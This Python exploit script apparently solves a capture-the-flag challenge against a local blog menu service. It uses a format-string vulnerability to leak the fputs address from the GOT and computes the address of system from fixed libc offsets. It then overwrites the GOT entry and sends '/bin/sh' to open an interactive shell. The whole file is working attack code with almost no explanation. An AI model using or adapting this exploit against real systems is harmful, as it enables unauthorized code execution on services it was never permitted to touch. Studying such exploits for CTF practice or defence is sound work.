#!/usr/bin/env python
# coding=utf-8
from zio import *
from libformatstr import FormatStr
import time
import os

fputs_got = 0x0804B05C
target_bin = ('127.0.0.1',4444)
target_pyc = ('127.0.0.1',6666)

io_bin = zio(target_bin, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))
io_pyc = zio(target_pyc, timeout=10000, print_read=COLORED(RAW, 'yellow'), print_write=COLORED(RAW, 'green'))


def ListBlog(io):
	io.read_until('Your choice:')
	io.writeline('1')

def WriteBlog(io,content):
	io.read_until('Your choice:')
	io.writeline('2')
	io.read_until('Please input blog content:')
	io.writeline(str(content))

def ReadBlog(io,filename):
	io.read_until('Your choice:')
	io.writeline('3')
	io.read_until('Please input blog name:')
	io.writeline(str(filename))

def Exit(io):
	io.read_until('Your choice:')
	io.writeline('4')


payload0 = "\x00"
WriteBlog(io_bin,payload0);
muhe_time = int(time.time())

payload = l32(fputs_got)
payload += "%74$s"
WriteBlog(io_pyc,payload)
muhe_time = int(time.time())
Exit(io_pyc)
io_pyc.close()


name = str(muhe_time) + ".em\x00"
ReadBlog(io_bin,name)

io_bin.readline()  #junk
content = io_bin.readline().replace("\n","")
print "fputs addr: 0x" + (content[-5:-1][::-1] or '').encode('hex')
fputs_addr = l32(content[-5:-1])

fputs_offset  = 0x000be230
system_offset = 0x0009a310
system_addr = fputs_addr - fputs_offset + system_offset
print "system addr: " + hex(system_addr)



io_bin.writeline('2')
io_bin.read_until('Please input blog content:')
payload1 = "\x00"
io_bin.writeline(payload1)
muhe_time = int(time.time())

#format sting
p = FormatStr()
p[fputs_got] = system_addr
payload = p.payload(74,start_len=0x0)
io_pyc = zio(target_pyc, timeout=10000, print_read=COLORED(RAW, 'yellow'), print_write=COLORED(RAW, 'green'))

WriteBlog(io_pyc,payload)
muhe_time = int(time.time())
Exit(io_pyc)
io_pyc.close()

#format str vuln
raw_input('$$$')
name = str(muhe_time) + ".em\x00"
io_bin.read_until('choice:')
io_bin.writeline('3')
io_bin.read_until('Please input blog name:')
io_bin.writeline(name)

#getshell

io_bin.writeline('2')
payload = '/bin/sh\0'
io_bin.writeline(payload)

io_bin.interact()
os.system('./clean.sh')